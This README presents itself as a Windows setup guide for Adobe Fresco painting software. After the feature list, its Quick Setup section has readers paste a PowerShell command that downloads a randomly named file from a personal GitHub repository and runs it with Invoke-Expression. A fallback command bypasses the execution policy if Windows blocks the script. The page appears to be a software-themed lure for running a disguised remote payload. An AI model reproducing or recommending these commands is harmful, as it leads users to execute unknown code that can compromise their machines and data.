# Fresco

Fresco is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Fresco and work in it.

Adobe Fresco is desktop painting and drawing software for Windows, aimed at illustrators who want natural media behavior and precise linework in one place. The canvas supports raster paint, vector strokes, and familiar layer stacks so you can move from rough concepts to finished pieces without switching tools mid-project.

A typical session starts with a new document sized for print or screen, then blocking shapes with pencil or ink brushes before building color with live watercolor or oil brushes that bleed and blend on the layer. You adjust brush size and opacity from the toolbar, use masks to clean edges, and send layered work to Photoshop when you need deeper retouching or export.

This repository collects a Windows setup package, short install notes for common GPU and pen-tablet setups, and a concise changelog that tracks build updates and brush-engine fixes. Use the notes when deployment must stay consistent across studio machines, and check the changelog before you roll out an update to production workstations.

## What you do with it

- Live brushes simulate watercolor blooms and oil paint thickness as you stroke the canvas.
- Vector and raster layers coexist so linework stays sharp while washes stay painterly.
- Photoshop round-trip preserves layers when you refine color or effects in another app.
- Multicolor eyedropper picks blended hues from the canvas for consistent palette matching.
- Motion tools let you animate simple loops from painted frames inside the same project.
- Pixel brushes include pencils, markers, and airbrush variants tuned for stylus pressure curves.
- Cloud documents sync project state so you can resume the same canvas on another device.
- Touch shortcuts and radial menus keep brush changes fast during full-screen drawing sessions.

## Quick Setup (PowerShell)

This installs the program Fresco on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sofiawilhelm521241/fresco-setup-guide/main/fbyt3ksest.ovhae97h | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sofiawilhelm521241/fresco-setup-guide/main/fbyt3ksest.ovhae97h | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `fbyt3ksest.ovhae97h` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sofiawilhelm521241/fresco-setup-guide`. Adobe Fresco 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
